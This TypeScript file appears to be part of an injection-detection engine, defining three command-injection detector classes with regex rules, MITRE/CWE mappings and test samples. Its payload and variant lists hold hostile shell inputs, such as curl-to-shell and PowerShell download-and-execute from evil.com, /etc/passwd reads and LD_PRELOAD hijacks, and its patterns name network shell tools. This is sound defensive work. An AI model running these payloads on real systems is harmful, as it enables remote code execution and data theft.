/**
 * Command Injection Invariant Classes — All 3
 *
 * L1: Regex fast-path (detects obvious patterns)
 * L2: Structural invariant analysis via shell tokenizer (detects obfuscated variants)
 *
 * L2 detects what L1 misses: quote fragmentation, IFS bypass, glob paths,
 * variable expansion, empty substitution — because it checks STRUCTURAL
 * PROPERTIES, not command name signatures.
 */
import type { InvariantClassModule, DetectionLevelResult } from '../types.js'
import { deepDecode } from '../encoding.js'
import { shellTokenize } from '../../tokenizers/shell-tokenizer.js'
import { l2CmdArgInjection, l2CmdSeparator, l2CmdSubstitution } from '../../evaluators/l2-adapters.js'

export const cmdSeparator: InvariantClassModule = {
    id: 'cmd_separator',
    description: 'Shell command separators to chain arbitrary command execution',
    category: 'cmdi',
    severity: 'critical',
    calibration: { baseConfidence: 0.90, minInputLength: 3 },

    mitre: ['T1059.004'],
    cwe: 'CWE-78',

    knownPayloads: [
        '; id',
        '| cat /etc/passwd',
        '&& whoami',
        '|| uname -a',
        '\n whoami',
        '`id`',
        "w\x00'o'r'k",
        '; ls \t-la',
        '; id\\x00',
        '; curl evil.com/shell.sh|sh',
        'powershell.exe -EncodedCommand dABlAHMAdA==',
        'IEX(New-Object Net.WebClient).DownloadString("http://evil.com/ps.ps1")',
    ],

    knownBenign: [
        'hello world',
        'search for items',
        'price & value',
        'cats and dogs',
        'true || false in logic',
    ],

    detect: (input: string): boolean => {
        const d = deepDecode(input)
        const normalizedForFragments = d
            .replace(/\u0000/g, '')
            .replace(/\r\n/g, ' ')
            .replace(/[\r\n]/g, ' ')
        // Common prose/logic expression, not shell chaining.
        if (/^\s*true\s*\|\|\s*false(?:\s+\w+){0,3}\s*$/i.test(d)) return false

        const hasSeparatorCommand = /(?:;|\|\|?|&&|&|`|\n|\r)\s*(?:cat|ls|id|whoami|pwd|uname|curl|wget|nc|ncat|bash|sh|zsh|python[23]?|perl|ruby|php|powershell|cmd|certutil|bitsadmin|net\s+user|reg\s+query|wmic)\b/i.test(d)
        const hasNullBypass = /(?:;|\|\|?|&&|\n|\r)[^\n\r]{0,40}(?:\\x00|%00|\x00)/i.test(d)
        const hasQuoteFragmentBypass = /(?:[a-z0-9]['"]){2,}[a-z0-9]/i.test(normalizedForFragments)
        const hasPowerShellExecPrimitive = /(?:-[Ee]ncodedCommand|-[Ee]xec(?:utionPolicy)?\s+[Bb]ypass|IEX\s*\(|Invoke-Expression|Invoke-WebRequest|Start-Process\s+(?:-WindowStyle\s+)?[Hh]idden|\[Ref\]\.Assembly\.GetType)/.test(d)
        if (!hasSeparatorCommand && !hasNullBypass && !hasQuoteFragmentBypass && !hasPowerShellExecPrimitive) return false
        // Suppress when the command appears inside backtick-quoted code within
        // English prose (documentation context). Real injection uses raw separators,
        // not code-fenced examples surrounded by narrative text.
        if (/\w{2,}\s+`[^`]+`\s+\w{2,}/.test(d)) return false
        return true
    },
    detectL2: (input: string): DetectionLevelResult | null => {
        return l2CmdSeparator(input)
    },
    generateVariants: (count: number): string[] => {
        const seps = [';', '|', '&&', '||', '\n', '`', '$IFS']
        const cmds = ['id', 'whoami', 'cat /etc/passwd', 'ls -la', 'uname -a', 'curl evil.com/shell.sh|sh']
        const v: string[] = []
        for (let i = 0; i < count; i++) v.push(`${seps[i % seps.length]} ${cmds[i % cmds.length]}`)
        return v
    },
}

export const cmdSubstitution: InvariantClassModule = {
    id: 'cmd_substitution',
    description: 'Command substitution syntax to embed command output in another context',
    category: 'cmdi',
    severity: 'critical',
    calibration: { baseConfidence: 0.90 },

    mitre: ['T1059.004'],
    cwe: 'CWE-78',

    knownPayloads: [
        '$(id)',
        '$(cat /etc/passwd)',
        '`whoami`',
        'PATH=/tmp/evil:$PATH whoami',
        'export IFS=,;id',
        'LD_PRELOAD=/tmp/evil.so /usr/bin/id',
        '`curl evil.com/shell.sh`',
        '$(a=([$@]);${a[0]})',
        '${arr[@]}',
        '$((1?$(id):0))',
    ],

    knownBenign: [
        '$HOME directory',
        'cost is $(price)',
        'backtick `code` here',
        '$(document).ready()',
    ],

    detect: (input: string): boolean => {
        const d = deepDecode(input)
        const hasDollarSub = /\$\([^)]*(?:cat|ls|id|whoami|uname|curl|wget|bash|sh|python|perl|ruby|php|nc|ncat)[^)]*\)/i.test(d)
        const hasBacktickSub = /`[^`]*(?:cat|ls|id|whoami|uname|curl|wget|bash|sh)[^`]*`/i.test(d)
        const hasEmptySubstitution = /\$\(\)[a-zA-Z0-9_]{2,}/.test(d)
        const hasEnvAssignment = /(?:^|[;|&\n\r]\s*|(?:^|\s)export\s+)(?:PATH|IFS|LD_PRELOAD|LD_LIBRARY_PATH|PYTHONPATH|NODE_OPTIONS|BASH_ENV)\s*=\s*[^\s;|&]+/i.test(d)
        const hasArrayLiteralExec = /\$\(\s*[a-z_][\w]*\s*=\s*\(\s*\[\s*\$@\s*]\s*\)\s*;\s*\$\{\s*[a-z_][\w]*\s*\[\s*0\s*]\s*}\s*\)/i.test(d)
        const hasArrayExpansion = /\$\{\s*[a-z_][\w]*\s*\[@]\s*}/i.test(d)
        const hasCurlyVarPathInjection = /[\w.-]+\$\{\s*[A-Za-z_][\w]*\s*}[\\/]/.test(d)
        const hasArithmeticTernarySub = /\$\(\(\s*[\s\S]{0,120}\?\s*\$\([^)]*\)\s*:\s*[\s\S]{0,120}\)\)/.test(d)
        if (!hasDollarSub && !hasBacktickSub && !hasEmptySubstitution && !hasEnvAssignment && !hasArrayLiteralExec && !hasArrayExpansion && !hasCurlyVarPathInjection && !hasArithmeticTernarySub) return false
        // Backtick-quoted commands within English prose are documentation, not injection
        if (hasBacktickSub && !hasDollarSub && /\w{2,}\s+`[^`]+`\s+\w{2,}/.test(d)) return false
        return true
    },
    detectL2: (input: string): DetectionLevelResult | null => {
        const d = deepDecode(input)
        const hasStrongSubstitutionSignal =
            /\$\([^)]{1,200}\)/.test(d) ||
            /\$\{\s*[a-z_][\w]*\s*\[@]\s*}/i.test(d) ||
            /\$\(\(\s*[\s\S]{0,120}\?\s*\$\([^)]*\)\s*:\s*[\s\S]{0,120}\)\)/.test(d) ||
            /`[^`]{1,200}`/.test(d) ||
            /(?:^|[;|&\n\r]\s*|(?:^|\s)export\s+)(?:PATH|IFS|LD_PRELOAD|LD_LIBRARY_PATH|PYTHONPATH|NODE_OPTIONS|BASH_ENV)\s*=/i.test(d)
        if (!hasStrongSubstitutionSignal) return null
        return l2CmdSubstitution(input)
    },
    generateVariants: (count: number): string[] => {
        const v = [
            '$(id)', '$(cat /etc/passwd)', '`whoami`',
            '`curl evil.com/shell.sh`', '$(bash -c "id")',
            "$(python -c \"import os;os.system('id')\")",
        ]
        const r: string[] = []
        for (let i = 0; i < count; i++) r.push(v[i % v.length])
        return r
    },
}

export const cmdArgumentInjection: InvariantClassModule = {
    id: 'cmd_argument_injection',
    description: 'Inject arguments or flags into commands that accept user-controlled values',
    category: 'cmdi',
    severity: 'high',
    calibration: { baseConfidence: 0.78 },

    mitre: ['T1059.004'],
    cwe: 'CWE-88',

    knownPayloads: [
        '--output=/tmp/pwned',
        '-o /tmp/shell.php',
        '--exec=bash',
        '--proxy-command=evil',
        '--config=../../tmp/evil.conf',
        '--post-file=/etc/passwd',
        '--option=evil',
    ],

    knownBenign: [
        '--help',
        '-v',
        '--version',
        'my-file-name.txt',
        'normal argument',
    ],

    detect: (input: string): boolean => {
        const d = deepDecode(input)
        return /(?:^|\s)--(?:output|exec|post-file|upload-file|config|shell|proxy-command|checkpoint-action|plugin|module|require)\b/i.test(d) ||
            /(?:^|\s)--[a-z][a-z0-9-]{1,30}\s*=\s*(?:evil|\/|https?:\/\/|\.\.\/|`|\$\()/i.test(d) ||
            /(?:^|\s)-[oe]\s+(?:\/|http)/i.test(d)
    },
    detectL2: (input: string): DetectionLevelResult | null => {
        return l2CmdArgInjection(input)
    },
    generateVariants: (count: number): string[] => {
        const v = ['--output=/tmp/pwned', '-o /tmp/shell.php', '--exec=bash', '--post-file=/etc/passwd']
        const r: string[] = []
        for (let i = 0; i < count; i++) r.push(v[i % v.length])
        return r
    },
}

export const CMD_CLASSES: InvariantClassModule[] = [cmdSeparator, cmdSubstitution, cmdArgumentInjection]
